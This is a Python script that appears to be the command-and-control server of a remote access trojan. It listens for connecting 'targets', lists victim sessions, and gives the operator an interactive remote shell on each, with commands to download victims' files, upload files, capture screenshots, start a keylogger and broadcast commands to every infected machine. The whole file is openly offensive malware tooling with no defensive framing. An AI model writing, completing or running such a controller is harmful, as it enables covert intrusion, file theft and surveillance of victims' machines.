#!/usr/bin/python

from itertools import count
import socket, json, os, base64, threading

global sock
clients = 0
count = 0
stop_thrdsvr = False

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(("192.168.1.10", 54321))
sock.listen(5)

ips = []
targets = []

def send_all(target, data):
    json_data = json.dumps(data)
    target.send(json_data)

def shell(target, ip):

    def reliable_send(data):
        json_data = json.dumps(data)
        target.send(json_data)

    def reliable_recv():
        data = ""
        while True:
            try:
                data = data + target.recv(1024)
                return json.loads(data)
            except ValueError:
                continue

    global count
    while True:
        command = input("* Shell#~%s: " % str(ip))
        reliable_send(command)
        if command == "quit":
            break
        elif command == "exit":
            target.close()
            targets.remove(target)
            ips.remove(ip)
            break
        elif command[:2] == "cd" and len(command) > 1:
            continue
        elif command[:8] == "download":
            with open(command[9:], "wb") as file:
                dl = reliable_recv()
                file.write(base64.b64decode(dl))
        elif command[:6] == "upload":
            try:
                with open(command[7:], "rb") as file:
                    reliable_send(base64.b64encode(file.read()))
            except:
                failed = "Failed to upload"
                reliable_send(base64.b64encode(failed))
        elif command[:10] == "screenshot":
            with open("screenshot%d" % count, "wb") as ss:
                image = reliable_recv()
                image_decode = base64.b64decode(image)
                if image_decode[:4] == "[!!}":
                    print(image_decode)
                else:
                    ss.write(image_decode)
                    count += 1
        elif command[:12] == "keylog_start":
            continue
        else:
            result = reliable_recv()
            print(result)

def server():
    global clients
    while True:
        if stop_thrdsvr:
            break
        sock.settimeout(1)
        try:
            target, ip = sock.accept()
            targets.append(target)
            ips.append(ip)
            print(str(targets[clients]) + " --- " + str(ips[clients]) + " CONNECTED")
            clients += 1
        except:
            pass

print("[+] Waiting for targets to connect...")

thrd1 = threading.Thread(target=server)
thrd1.start()

while True:
    command = input(" * Center: ")
    if command == "targets":
        count = 0
        for ip in ips:
            print("Session " + str(count) + ". <---> " +str(ip))
            count += 1
    elif command[:7] == "session":
        try:
            ses = int(command[8:])
            tarses = targets[ses]
            tarip = ips[ses]
            shell(tarses, tarip)
        except:
            print("[!!] No such session")
    
    elif command == "exit":
        for target in targets:
            target.close()
        sock.close()
        stop_thrdsvr = True
        thrd1.join()
        break
    elif command[:7] == "sendall":
        length_of_targets = len(targets)
        i = 0
        try:
            while i < length_of_targets:
                tarnum = targets[i]
                print(tarnum)
                send_all(tarnum, command)
                i += 1
        except:
            print("[!!] Failed to send command to all targets")
    else:
        print("[!!] Command does not exist")
